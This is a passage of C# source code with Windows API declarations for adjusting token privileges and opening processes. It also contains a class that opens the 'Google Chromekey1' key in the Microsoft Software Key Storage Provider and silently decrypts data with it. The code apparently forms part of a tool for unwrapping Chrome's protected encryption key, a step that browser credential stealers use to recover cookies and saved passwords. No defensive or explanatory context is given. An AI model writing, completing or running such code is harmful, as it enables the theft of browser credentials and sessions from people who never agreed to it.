                IntPtr TokenHandle,
                bool DisableAllPrivileges,
                ref TOKEN_PRIVILEGES NewState,
                int BufferLength,
                IntPtr PreviousState,
                IntPtr ReturnLength);

            [DllImport("kernel32.dll")]
            static extern IntPtr OpenProcess(
                ProcessAccessFlags dwDesiredAccess,
                bool bInheritHandle,
                int dwProcessId);

            [DllImport("kernel32.dll")]
            static extern bool CloseHandle(IntPtr hObject);

            // ---------------- structs ----------------

            enum TOKEN_TYPE { TokenPrimary = 1, TokenImpersonation }
            enum SECURITY_IMPERSONATION_LEVEL { SecurityImpersonation = 2 }

            [StructLayout(LayoutKind.Sequential)]
            struct LUID { public uint LowPart; public int HighPart; }

            [StructLayout(LayoutKind.Sequential)]
            struct LUID_AND_ATTRIBUTES
            {
                public LUID Luid;
                public uint Attributes;
            }

            [StructLayout(LayoutKind.Sequential)]
            struct TOKEN_PRIVILEGES
            {
                public int PrivilegeCount;
                public LUID_AND_ATTRIBUTES[] Privileges;
            }

            enum ProcessAccessFlags : uint
            {
                QueryInformation = 0x0400
            }
        }
        public static class CngDecryptor
        {
            private const int NCRYPT_SILENT_FLAG = 0x40;

            public static byte[] DecryptWithCng(byte[] input)
            {
                IntPtr hProvider;
                int status = NCryptOpenStorageProvider(
                    out hProvider,
                    "Microsoft Software Key Storage Provider",
                    0);

                if (status != 0)
                    throw new Exception($"NCryptOpenStorageProvider failed: {status}");

                IntPtr hKey;
                status = NCryptOpenKey(
                    hProvider,
                    out hKey,
                    "Google Chromekey1",
                    0,
                    0);

                if (status != 0)
                    throw new Exception($"NCryptOpenKey failed: {status}");

                int pcbResult = 0;

                // First call: query size
                status = NCryptDecrypt(
                    hKey,
                    input,
                    input.Length,
                    IntPtr.Zero,
                    null,
                    0,
                    ref pcbResult,
                    NCRYPT_SILENT_FLAG);

                if (status != 0)
                    throw new Exception($"NCryptDecrypt (size) failed: {status}");

                byte[] output = new byte[pcbResult];

                // Second call: actual decrypt
                status = NCryptDecrypt(
                    hKey,
                    input,
                    input.Length,
                    IntPtr.Zero,
                    output,
                    output.Length,
                    ref pcbResult,
                    NCRYPT_SILENT_FLAG);

                if (status != 0)
                    throw new Exception($"NCryptDecrypt failed: {status}");

                NCryptFreeObject(hKey);
                NCryptFreeObject(hProvider);

                return output;
            }

            // ---------------- P/Invoke ----------------

            [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
            static extern int NCryptOpenStorageProvider(
                out IntPtr phProvider,
                string pszProviderName,
                int dwFlags);

            [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
            static extern int NCryptOpenKey(
                IntPtr hProvider,
                out IntPtr phKey,
                string pszKeyName,
                int dwLegacyKeySpec,
                int dwFlags);

            [DllImport("ncrypt.dll")]
            static extern int NCryptDecrypt(
                IntPtr hKey,
                byte[] pbInput,
                int cbInput,
                IntPtr pPaddingInfo,
                byte[] pbOutput,
                int cbOutput,
                ref int pcbResult,
                int dwFlags);

            [DllImport("ncrypt.dll")]
            static extern int NCryptFreeObject(IntPtr hObject);
        }
    }
}
